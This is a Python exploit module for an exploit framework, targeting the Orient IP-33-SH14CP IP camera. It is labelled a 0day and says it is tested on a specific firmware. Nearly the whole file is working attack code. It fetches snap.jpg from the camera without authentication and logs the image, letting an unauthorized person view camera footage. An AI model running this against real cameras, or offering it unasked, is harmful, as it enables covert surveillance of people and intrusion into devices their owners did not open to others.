#!/usr/bin/env python

import urllib2
import urllib
import os
import struct
import tarfile
import base64
from cStringIO import StringIO
import time
from collections import OrderedDict
from core.WebHelper import FormPoster
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_orient_ip33_sh14cp_snapshot"
INFO['DESCRIPTION'] = "Orient IP-33-SH14CP IP Camera Snapshot"
INFO['VENDOR'] = "http://www.orientrus.ru/"
INFO["CVE Name"] = "0day"
INFO["DOWNLOAD_LINK"] = ""
INFO["LINKS"] = []
INFO['CHANGELOG'] = "12 May, 2017"
INFO['PATH'] = "General/"
INFO["NOTES"] = """
    Unauthorized attacker can make snapshot.
Tested against firmware 3518C_IMX225_W_6.1.23.2_A3.
"""

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.13"
OPTIONS["PORT"] = 80


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])

    def make_url(self, path=''):
        url = 'http://{}:{}/{}'.format(self.host, self.port, path)
        return url

    def run(self):
        #Get options from gui
        self.args()
        self.log("[*] Trying to connect to {}".format(self.make_url()))
        url = self.make_url('snap.jpg')
        res = urllib2.urlopen(url).read()
        self.logImage(res)
        self.finish(True)


if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()
